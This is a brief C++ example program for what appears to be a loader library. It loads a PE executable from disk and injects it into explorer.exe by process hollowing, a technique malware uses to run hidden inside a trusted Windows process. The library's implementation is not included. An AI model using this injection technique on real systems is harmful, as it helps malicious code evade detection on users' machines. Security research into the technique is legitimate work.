/**
 * example_inject.cpp
 **/

#include "loader.hpp"

int main(int argc, char **argv)
{
    /* read pe data into memory */
    loader_t loader;
    loader_read_file(&loader, "data/sample.exe");

    /* inject pe via process hollowing */
    loader_inject(&loader, "C:/Windows/explorer.exe");

    loader_free(&loader);
    return 0;
}